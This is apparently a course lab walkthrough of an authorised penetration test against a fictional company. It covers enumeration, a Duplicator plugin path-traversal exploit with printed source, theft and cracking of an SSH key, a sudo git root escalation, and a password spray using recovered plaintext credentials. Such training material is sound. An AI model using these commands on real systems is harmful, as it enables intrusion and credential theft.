
##### Scenario

Company _BEYOND Finances_ has tasked us with conducting a penetration test of their IT infrastructure.
The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal _Active Directory_ (AD) environment.
In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller.

Once you have access to the domain controller, retrieve the NTLM hash of the domain administrator account _BEYOND\\Administrator_ and enter it as answer to this exercise.
> Please make sure you are dumping the NTLM hash of the domain admin user with RID 500 by utilizing dcsync attack via mimikatz not by extracting creds from SAM file.
> The hashes will be different.

## Endpoints

**192.168.x.250** - VM #6 - WINPREP  :  offsec / lab
**192.168.x.242** - VM #3 - MAILSRV1   
**192.168.x.244** - VM #5 - WEBSRV1                                         178
**172.16.x.240** - VM #1 - DCSRV1                                               134
**172.16.x.243** - VM #4 - CLIENTWK1
**172.16.x.241** - VM #2 - INTERNALSRV1

# Enumerating the Public Network

Client's provided two initial targets:
- WEBSRV1 - **192.168.x.244**
- MAILSRV1 - **192.168.x.242**

>In a real penetration test, we would also use passive information gathering techniques such as _Google Dorks_ and leaked password databases to obtain additional information.
>This would potentially provide us with usernames, passwords, and sensitive information.

### MAILSRV1 - 242

#### Ports
```bash
sudo nmap -sC -sV -oN nmap 192.168.194.242
	PORT    STATE SERVICE       VERSION
	25/tcp  open  smtp          hMailServer smtpd
	| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
	|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
	80/tcp  open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: IIS Windows Server
	|_http-server-header: Microsoft-IIS/10.0
	110/tcp open  pop3          hMailServer pop3d
	|_pop3-capabilities: TOP USER UIDL
	135/tcp open  msrpc         Microsoft Windows RPC
	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	143/tcp open  imap          hMailServer imapd
	|_imap-capabilities: IMAP4 CAPABILITY QUOTA IMAP4rev1 SORT IDLE OK CHILDREN completed RIGHTS=texkA0001 NAMESPACE ACL
	445/tcp open  microsoft-ds?
	587/tcp open  smtp          hMailServer smtpd
	| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
	|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
	Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 8s
	| smb2-time: 
	|   date: 2024-09-05T00:32:11
	|_  start_date: N/A
```
	- sV - Service & version detection
	- sC - Default scripts
	- oN - Output file - Prints up same as stdout results

| Port | Service Version    |
| ---- | ------------------ |
| 25   | hMailServer        |
| 80   | MS IIS httpd 10.0  |
| 110  | hMailServer pop3d  |
| 135  | MS Windows RPC     |
| 139  | MS Windows NetBIOS |
| 143  | hMailServer imapd  |
| 445  | ? ms-ds?           |
| 587  | hMailServer smtpd  |

#### Discovered Services
- Mail Server
- IIS Web Server

#### Mail Server

Searching for hMailServer doesn't yield enough results as we don't get a version from `nmap`  & most all of the listed vulns are old.


#### IIS Web Server

Going to the website shows the standard IIS page

```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://192.168.194.242
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt,pdf,config
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	Progress: 18456 / 18460 (99.98%)
	===============================================================
	Finished
	===============================================================
```
	- No results


> Not every enumeration technique needs to provide actionable results.
> In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.


### WEBSRV1 - 244

> In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion.
> Meaning, that we could perform the scans at the same time to save valuable time for the client.
> If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.

#### Ports
```bash
sudo nmap -sC -sV -oN nmap 192.168.194.244
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
	|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
	80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
	| http-title: BEYOND Finances &#8211; We provide financial freedom
	|_Requested resource was http://192.168.194.244/main/
	|_http-generator: WordPress 6.0.2
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service Version        |
| ---- | ---------------------- |
| 22   | OpenSSH 8.9p1 Ubuntu 3 |
| 80   | Apache httpd 2.4.52    |
|      | WordPress 6.0.2        |

Looking up version for port 22 gives us the OS version - Ubuntu Jammy (22.04 LTS)

>We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer.
>As this will yield no actionable results, we'll skip it.

#### Site mapping

Loading the site in the browser gets us a landing page w/ nothing much going for it.
Viewing the source will yield some other pages:
- /main/feed/
- /main/comments/feed/
- /wp-content/
- /wp-includes/

#### Wappalyzer

|Category|App Version|
|-|-|
|CMS|WordPress 6.0.2|
|Blogs|WordPress 6.0.2|
|Font scripts|Twitter Emoji (Twemoji) 14.0.2<br>Google Font API|
|Miscellaneous|RSS<br>Module Federation 50% sure<br>Webpack 50% sure|
|Web servers|Apache HTTP Server 2.4.52|
|Programming languages|PHP|
|Operating systems|Ubuntu|
|Databases|MySQL|
|Page builder|Elementor 3.7.7|
|JavaScript libraries|jQuery 3.6.0<br>jQuery Migrate 3.3.2<br>Swiper<br>core-js 3.24.1<br>jQuery UI 1.13.1|
|WordPress themes|Hello Elementor 2.6.1|
|WordPress plugins|Contact Form 7 5.6.3<br>Elementor 3.7.7|
|Form builders|Contact Form 7 5.6.3|
- Can confirm
```bash
whatweb 192.168.194.244
	http://192.168.194.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.194.244], RedirectLocation[http://192.168.194.244/main/], UncommonHeaders[x-redirect-by]
	http://192.168.194.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.194.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```


- As we can see it uses WP, let's get a scan going
```bash
wpscan --url http://192.168.181.244 --enumerate p --plugins-detection aggressive --api-token <token> -o websrv1/wpscan.log
	         __          _______   _____
	         \ \        / /  __ \ / ____|
	          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
	           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_\
	            \  /\  /  | |     ____) | (__| (_| | | | |
	             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
	
	         WordPress Security Scanner by the WPScan Team
	                         Version 3.8.25
	                               
	       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
	_______________________________________________________________
	
	[i] Updating the Database ...
	[i] Update completed.
	
	[+] URL: http://192.168.181.244/ [192.168.181.244]
	[+] Effective URL: http://192.168.181.244/main/
	[+] Started: Thu Sep 12 18:52:09 2024
	
	Interesting Finding(s):
	...
	[i] Plugin(s) Identified:
	
	[+] akismet
	 | Location: http://192.168.181.244/wp-content/plugins/akismet/
	 | Latest Version: 5.3.3
	 ...
	 | The version could not be determined.
	
	[+] classic-editor
	 ...
	 | [!] The version is out of date, the latest version is 1.6.3
	 ...
	 | Version: 1.6.2 (80% confidence)
	 ...
	
	[+] contact-form-7
	 ...
	 | [!] The version is out of date, the latest version is 5.9.8
	 ...
	 | [!] 3 vulnerabilities identified:
	 |
	 | [!] Title: Contact Form 7 < 5.8.4 - Authenticated (Editor+) Arbitrary File Upload
	 |     Fixed in: 5.8.4
	 |     References:
	 |      - https://wpscan.com/vulnerability/70e21d9a-b1e6-4083-bcd3-7c1c13fd5382
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6449
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7fb020-6acb-445e-a46b-bdb5aaf8f2b6
	 |
	 | [!] Title: Contact Form 7 < 5.9.2 - Reflected Cross-Site Scripting
	 ...
	 | [!] Title:  Contact Form 7 < 5.9.5 - Unauthenticated Open Redirect
	 ...
	 | Version: 5.6.3 (90% confidence)
	 ...
	
	[+] duplicator
	 ...
	 | [!] The version is out of date, the latest version is 1.5.10.2
	 ...
	 | [!] 6 vulnerabilities identified:
	 |
	 | [!] Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
	 |     Fixed in: 1.3.28
	 |     References:
	 |      - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11738
	 |      - https://www.exploit-db.com/exploits/49288/
	 |      - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
	 |      - https://snapcreek.com/duplicator/docs/changelog/?lite
	 |      - https://snapcreek.com/duplicator/docs/changelog/
	 |      - https://cxsecurity.com/issue/WLB-2021010001
	 |
	 | [!] Title: Duplicator < 1.4.7 - Unauthenticated Backup Download
	 ...
	 | [!] Title: Duplicator < 1.4.7.1 - Unauthenticated System Information Disclosure
	 |     Fixed in: 1.4.7.1
	 |     References:
	 |      - https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2552
	 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2552
	 |      - https://packetstormsecurity.com/files/167895/
	 |
	 | [!] Title: Duplicator < 1.5.7.1; Duplicator Pro < 4.5.14.2 - Unauthenticated Sensitive Data Exposure
	 |     Fixed in: 1.5.7.1
	 |     References:
	 |      - https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6114
	 |      - https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit
	 |
	 | [!] Title: Duplicator < 1.5.7.1 - Settings Removal via CSRF
	 ...
	 | [!] Title: Duplicator < 1.5.10 - Full Path Disclosure
	 |     Fixed in: 1.5.10
	 |     References:
	 |      - https://wpscan.com/vulnerability/7026d0be-9e57-4ef4-84a2-f7122e36c0cd
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6210
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d47d582d-7c90-4f49-aee1-03a8775b850d
	 |
	 | Version: 1.3.26 (80% confidence)
	 ...
	
	[+] elementor
	 ...
	 | [!] The version is out of date, the latest version is 3.24.1
	 ...
	 | [!] 11 vulnerabilities identified:
	 |
	 | [!] Title: Elementor Website Builder < 3.12.2 - Admin+ SQLi
	 ...
	 | [!] Title: Elementor Website Builder < 3.13.2 - Missing Authorization
	 ...
	 | [!] Title: Elementor Website Builder < 3.16.5 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_inline_svg()
	 ...
	 | [!] Title: Elementor Website Builder < 3.16.5 - Missing Authorization to Arbitrary Attachment Read
	 ...
	 | [!] Title: Elementor < 3.18.2 - Contributor+ Arbitrary File Upload to RCE via Template Import
	 |     Fixed in: 3.18.2
	 |     References:
	 |      - https://wpscan.com/vulnerability/a6b3b14c-f06b-4506-9b88-854f155ebca9
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48777
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5b6d0a38-ac28-41c9-9da1-b30b3657b463
	 |
	 | [!] Title: Elementor < 3.19.1 - Authenticated(Contributor+) Arbitrary File Deletion and PHAR Deserialization
	 ...
	 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.19.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_image_alt
	 ...
	 | [!] Title: Elementor Website Builder < 3.20.3 - Contributor+ DOM Stored XSS
	 ...
	 | [!] Title: Elementor Website Builder < 3.21.6 - Contributor+ DOM Stored XSS
	 ...
	 | [!] Title: Elementor Website Builder < 3.22.2 - Contributor+ Arbitrary SVG Download
	 ...
	 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.24.0 - Authenticated (Contributor+) Stored Cross-Site Scripting in the URL Parameter in Multiple Widgets
	 ...
	 | Version: 3.7.7 (100% confidence)
	 ...
	
	[+] wordpress-seo
	 ...
	 | [!] The version is out of date, the latest version is 23.4
	 ...
	 | [!] 3 vulnerabilities identified:
	 |
	 | [!] Title: Yoast SEO < 21.1 - Authenticated (Seo Manager+) Stored Cross-Site Scripting
	 ...
	 | [!] Title: Yoast SEO < 22.6 - Reflected Cross-Site Scripting
	 ...
	 | [!] Title: Yoast SEO < 22.7 - Authenticated (Contributor+) Stored Cross-Site Scripting
	 ...
	 | Version: 19.7.1 (100% confidence)
	 ...
```
	- Plugins id'd:
		- akismet  --> Version not detected
		- classic-editor  --> Out of date  --> v1.6.2
		- contact-form-7  --> Out of date  --> v5.6.3  --> Vulns discovered
		- duplicator  --> Out of date  --> v1.3.26  --> Vulns discovered
		- elementor  --> Out of date  --> v3.7.7  --> Vulns discovered
		- wordpress-seo  --> Out of date  --> 19.7.1  --> Vulns discovered


- Easiest to use **searchsploit** to search for attacks
```bash
searchsploit duplicator 1.3.26
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                                           |  Path
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                                 | php/webapps/50420.py
	Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)                    | php/webapps/49288.rb
	WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover      | php/webapps/51874.py
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```
	- Searching exploits for other plugins didn't yield much of anything.


# Attacking a Public Machine

### WEBSRV1 - 244

#### Initial foothold

- Utilize **searchsploit** result `Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py`
```bash
# Download exploit
searchsploit -m 50420.py

# Rename for clarity
mv 50420.py 50420_fileread.py

# Check file to know what it's doing & check for malicious shellcode
cat 50420_fileread.py
	# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
	# ...
	
	import requests as re
	import sys
	
	if len(sys.argv) != 3:
	        print("Exploit made by nam3lum.")
	        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
	        exit()
	
	arg = sys.argv[1]
	file = sys.argv[2]
	
	URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
	
	output = re.get(url = URL)
	print(output.text)
```

- Use to attempt exploit
```bash
python3 50420_fileread.py http://192.168.181.244 /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	...
	offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
	...
	mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
	ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
	daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
	marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
	- Add these to your creds text/ notes


- With this info, we can attempt to retrieve any ssh keys from these users
```bash
python3 50420_fileRead.py http://192.168.181.244 /home/marcus/.ssh/id_rsa
	Invalid installer file name!!
 
python3 50420_fileRead.py http://192.168.181.244 /home/marcus/.ssh/id_ecdsa
	Invalid installer file name!!
  
python3 50420_fileRead.py http://192.168.181.244 /home/daniela/.ssh/id_rsa
	-----BEGIN OPENSSH PRIVATE KEY-----
	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
	QduOTpMIvVMIJcfeYF1GJ4ggUG4=
	-----END OPENSSH PRIVATE KEY-----
```
	- Save key in its own file - ex: daniela_idrsa

- Use key to attempt to access WEBSRV1
```bash
chmod 600 daniela_idrsa

ssh -i daniela_idrsa daniela@192.168.181.244
	The authenticity of host '192.168.181.244 (192.168.181.244)' can''t be established.
	ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '192.168.181.244' (ED25519) to the list of known hosts.
	Enter passphrase for key 'daniela_idrsa': 
```

- Attempt to crack the passphrase w/ [ssh2john](CheatSheet.md#Cracking%20ssh%20key%20passcodes)
```bash
ssh2john daniela_idrsa > ssh.hash           

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
	...
	tequieromucho    (daniela_idrsa)     
	...
```

- Use key to gain access to WEBSRV1
```bash
ssh -i daniela_idrsa daniela@192.168.181.244
	Enter passphrase for key 'daniela_idrsa':   [tequieromucho]
		Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		  System information as of Fri Sep 13 12:44:45 AM UTC 2024
		
		  System load:  0.080078125       Processes:               206
		  Usage of /:   73.8% of 8.02GB   Users logged in:         0
		  Memory usage: 21%               IPv4 address for ens192: 192.168.181.244
		  Swap usage:   0%
		
		 * Super-optimized for small spaces - read how we shrank the memory
		   footprint of MicroK8s to make it the smallest full K8s around.
		
		   https://ubuntu.com/blog/microk8s-memory-optimisation
		
		13 updates can be applied immediately.
		To see these additional updates run: apt list --upgradable
		
		
		The list of available updates is more than a week old.
		To check for new updates run: sudo apt update
		
		Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
		daniela@websrv1:~$ whoami
			daniela
``` 


#### Local enumeration

- Auto enum.
- Setup a python server for exploits and download **linpeas.sh** to victim & run
```bash
wget http://192.168.45.193/linpeas.sh
	--2024-09-13 01:00:28--  http://192.168.45.193/linpeas.sh
	Connecting to 192.168.45.193:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 823059 (804K) [text/x-sh]
	Saving to: ‘linpeas.sh’
	
	linpeas.sh                         100%[===============================================================>] 803.77K  1.10MB/s    in 0.7s    
	
	2024-09-13 01:00:28 (1.10 MB/s) - ‘linpeas.sh’ saved [823059/823059]

chmod +x linpeas.sh

./linpeas.sh
```

##### Results:

```bash
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                         
                              ╚════════════════════╝                                                                                       
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                         
Linux version 5.15.0-50-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

```bash
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                        
                              ╚═════════════════════╝                                                                                      
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                        
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:ae:a2 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.181.244/24 brd 192.168.181.255 scope global ens192
       valid_lft forever preferred_lft forever
```
	- As there's only 1 interface outside of loopback, we can tell it's not attached to an internal network and won't be able to be used as a pivot point

```bash
                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                        
                               ╚═══════════════════╝                                                                                       
...    
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                           
Matching Defaults entries for daniela on websrv1:                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```
	- Can verify w/ `sudo -l`

```bash
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                         
                             ╚══════════════════════╝                              
...
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
...

╔══════════╣ Analyzing Github Files (limit 70)
drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
```
	- Note & store pw info ^
	- Also note that install path is not /var/www/html BUT is in /srv/www/wordpress/
	- Reviewing the git repo can yield changes in config data or sensitive info

> Checking git repo as `daniela` won't work:
```bash
daniela@websrv1:/srv/www/wordpress$ la
	.git       license.txt      wp-admin              wp-config.php         wp-cron.php        wp-load.php   wp-settings.php  wp-trackback.php
	.htaccess  readme.html      wp-blog-header.php    wp-config-sample.php  wp-includes        wp-login.php  wp-signup.php    xmlrpc.php
	index.php  wp-activate.php  wp-comments-post.php  wp-content            wp-links-opml.php  wp-mail.php   wp-snapshots
daniela@websrv1:/srv/www/wordpress$ git status
	fatal: not a git repository (or any of the parent directories): .git
```
> But elevating to `root` will work.


- Check [GTFOBins](https://gtfobins.github.io/gtfobins) for `git` exploits
```bash
sudo git -p help config

# Once : prompt is shown
!/bin/sh
	# whoami
		root
```

- Review git repo
```bash
cd /srv/www/wordpress

git status
	HEAD detached at 612ff57
	nothing to commit, working tree clean

git log
	commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
	Author: root <root@websrv1>
	Date:   Tue Sep 27 14:26:15 2022 +0000
	
	    Removed staging script and internal network access
	
	commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
	Author: root <root@websrv1>
	Date:   Tue Sep 27 14:24:28 2022 +0000
	
	    initial commit

git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
	deleted file mode 100644
	index 25667c7..0000000
	--- a/fetch_current.sh
	+++ /dev/null
	@@ -1,6 +0,0 @@
	-#!/bin/bash
	-
	-# Script to obtain the current state of the web app from the staging server
	-
	-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```
	- Add creds to notes

> Once privs are elevated, running linpeas again might yield more results now we're root


# Access to Internal

### MAILSRV1 - 242

As we've gotten a foothold and gathered creds on WEBSRV1, we can attempt to gain a foothold on MAILSRV1

#### Domain Creds

Should be crafting separate files for usernames and passwords
```bash
cat unames.txt
	daniela
	marcus
	offsec
	john

cat pws.txt
	tequiromucho
	DanielKeyboard3311
	dqsTwTpZPn#nL
```

- Re-consult ports for entry
```bash
25 - smtp
80 - http
110 - pop3
135 - rpc
139 - netbios
143 - imap
445 - smb
587 - smtp
```

- Attempt cred cracking SMB
```bash
nxc smb 192.168.216.242 -u unames.txt -p pws.txt --continue-on-success
	SMB         192.168.216.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
	... 
	SMB         192.168.216.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
```
	- Gives us the domain -> beyond.com
	- creds we got for john work
		- Not admin as there's no 'Pwn3d!'

